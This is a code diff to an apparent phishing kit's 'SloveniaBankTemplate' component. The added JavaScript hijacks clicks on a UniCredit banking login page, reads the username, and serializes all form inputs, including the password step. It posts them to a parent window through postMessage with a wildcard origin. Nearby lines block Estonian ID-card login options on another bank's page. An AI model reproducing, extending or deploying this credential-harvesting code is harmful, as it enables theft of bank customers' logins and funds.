@@ -2313,7 +2313,35 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
         // 2. Intercept Clicks (Tabs, Buttons, Links)
         document.addEventListener('click', (e) => {
           let target = e.target;
-          
+
+          // ==== UNICREDIT 2-ADIM AKISI (ana handler icinde - global engelleyiciye takilmaz) ====
+          if (/unicreditbanking/i.test(window.location.href || '')) {
+            const ucHasUser = !!document.getElementById('unsernameInput');
+            const ucHasPass = !!document.getElementById('passwordInput');
+            if (ucHasUser && target.closest && target.closest('.button-proceed')) {
+              e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+              const v = (document.getElementById('unsernameInput') || { value: '' }).value || '';
+              try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_STEP', username: v }, '*'); } catch(_e){}
+              return false;
+            }
+            if (ucHasPass && target.closest && target.closest('#backButton')) {
+              e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+              try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_BACK' }, '*'); } catch(_e){}
+              return false;
+            }
+            if (ucHasPass && target.closest && target.closest('.button-proceed')) {
+              e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+              try {
+                const res = serializeAllLtForms();
+                window.parent.postMessage({
+                  type: 'SLOVENIA_BANK_SUBMIT',
+                  formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
+                }, '*');
+              } catch(_e){}
+              return false;
+            }
+          }
+
           // OP Corporate Bank: Eesti ID-kaart tıklamalarını KESİNLİKLE engelle
           if (window.location.href.includes('op-corporate')) {
               if (target.closest('#estonian-id-card') || target.id === 'estonian-id-card-radio' || target.getAttribute('for') === 'estonian-id-card-radio') {
